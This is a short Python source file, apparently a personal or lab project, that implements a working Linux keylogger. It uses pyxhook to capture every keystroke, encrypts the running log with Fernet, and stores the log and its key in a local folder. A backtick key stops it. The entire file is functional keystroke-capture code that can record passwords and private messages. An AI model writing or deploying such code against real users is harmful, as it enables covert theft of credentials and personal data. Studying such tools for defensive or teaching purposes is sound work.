import os
import pyxhook
from cryptography.fernet import Fernet

LOG_DIR = "/home/cybes07/Desktop/Packet_Sniffer_and_keylogger/Key_logger"
KEY_FILE = os.path.join(LOG_DIR, "key.key")
ENC_FILE = os.path.join(LOG_DIR, "e_logs.txt")

os.makedirs(LOG_DIR, exist_ok=True)

# Generate or load encryption key
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as kf:
        kf.write(key)
else:
    with open(KEY_FILE, "rb") as kf:
        key = kf.read()

fernet = Fernet(key)

def handle_key(event):
    key_char = " " if event.Key == "space" else ("\n" if event.Key == "Return" else event.Key)
    
    # Read existing encrypted data if available
    if os.path.exists(ENC_FILE):
        with open(ENC_FILE, "rb") as ef:
            try:
                decrypted = fernet.decrypt(ef.read()).decode("utf-8")
            except Exception:
                decrypted = ""
    else:
        decrypted = ""

    # Append new keystroke and encrypt whole content back
    decrypted += key_char
    encrypted = fernet.encrypt(decrypted.encode("utf-8"))

    with open(ENC_FILE, "wb") as ef:
        ef.write(encrypted)

    if event.Ascii == 96:  # Killswitch: Press ` to stop
        hook.cancel()

hook = pyxhook.HookManager()
hook.KeyDown = handle_key
hook.HookKeyboard()
hook.start()